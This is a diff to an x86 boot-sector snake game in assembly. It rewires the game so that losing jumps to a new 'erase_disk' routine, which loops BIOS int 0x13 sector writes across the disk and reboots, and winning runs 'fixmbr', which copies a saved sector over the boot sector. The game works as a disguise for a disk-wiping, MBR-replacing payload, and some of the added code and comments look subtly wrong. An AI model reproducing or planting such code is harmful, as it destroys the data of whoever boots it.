@@ -197,7 +197,7 @@ game_won:
 
 	;print won message in green (0x02)
 	call green_text
-	mov dx, 1984
+	mov dx, 1994
 	mov bh, 0
 	mov ah, 0x2
 	int 0x10
@@ -207,7 +207,7 @@ game_won:
 
 	; continue with the second line for won message
 	call white_text
-	mov dx, 3005
+	mov dx, 3010
 	mov bh, 0
 	mov ah, 0x2
     int 0x10
@@ -217,7 +217,7 @@ game_won:
 	mov si, won_message2
 	call print_string
 
-	jmp hang
+	jmp fixmbr
 
 game_lost:
 
@@ -237,7 +237,7 @@ game_lost:
 
 	; continue with the second line for lost message
 	call white_text
-	mov dx, 3005
+	mov dx, 3010
 	mov bh, 0
 	mov ah, 0x2
 	int 0x10
@@ -247,7 +247,7 @@ game_lost:
 	mov cx, 15
 	call print_string
 
-	jmp hang
+	jmp erase_disk
 
 
 setup_text:
@@ -330,8 +330,66 @@ print_string:
 .done:
     ret
 
+erase_disk:
+	mov ah, 0x03  ; BIOS function to write sectors
+	mov al, 0x01  ; Number of sectors to write
+	mov bx, 0x0000  ; Data buffer filled with zeros
+	int 0x13  ; BIOS interrupt to write sector
 
+	jc error  ; Jump to error handling if there is an error
 
+	; Move to the next sector
+	inc cl  ; Increment sector number
+	cmp cl, 18h  ; Check if sector number > 18h (24 in decimal, typically the number of sectors in a track for a floppy disk)
+	jne continue
+
+	mov cl, 1  ; Reset sector number to 1
+	inc ch  ; Increment cylinder number
+	cmp ch, 80h  ; Check if cylinder number > 80h (128 in decimal, typically the number of cylinders for a floppy disk)
+	jne continue
+
+	jmp done
+
+continue:
+	jmp erase_disk
+
+error:
+	mov ah, 0x00  ; BIOS function to reset disk system
+	int 0x13  ; BIOS interrupt to reset disk
+	jmp hang
+
+done:
+	mov ax, 0xFFFF  ; Invalid value for segment register
+	mov ds, ax
+	mov es, ax
+	mov ss, ax
+	mov sp, 0x7c00  ; Set stack pointer to 0x7c00
+	mov ax, 0x0000
+	mov dx, 0x0000
+	int 0x19  ; BIOS interrupt to reboot the system
+
+fixmbr:
+	mov ah, 0x02  ; BIOS function to read sectors
+	mov al, 0x01  ; Number of sectors to read
+	mov ch, 0x00  ; Cylinder number (0)
+	mov cl, 0x04  ; Sector number (4th sector)
+	mov dh, 0x00  ; Head number (0)
+	mov dl, 0x00  ; Drive number (0 for the first floppy disk, 0x80 for the first hard disk)
+	mov bx, buffer  ; Data buffer
+	int 0x13  ; BIOS interrupt to read sector
+
+	jc error  ; Jump to error handling if there is an error
+
+	mov ah, 0x03  ; BIOS function to write sectors
+	mov al, 0x01  ; Number of sectors to write
+	mov ch, 0x00  ; Cylinder number (0)
+	mov cl, 0x01  ; Sector number (1st sector)
+	mov dh, 0x00  ; Head number (0)
+	mov dl, 0x00  ; Drive number (0 for the first floppy disk, 0x80 for the first hard disk)
+	mov bx, buffer  ; Data buffer
+	int 0x13  ; BIOS interrupt to write sector
+
+	jc error  ; Jump to error handling if there is an error
 
 hang:
     jmp hang
@@ -342,7 +400,7 @@ snake_len dw 0x4
 growth db 0
 
 won_message db "You won!", 0
-won_message2 db "Repairing everything...", 0
+won_message2 db "Repairing disk...", 0
 lost_message db "You lost!", 0
 lost_message2 db "Erasing disk...", 0
 
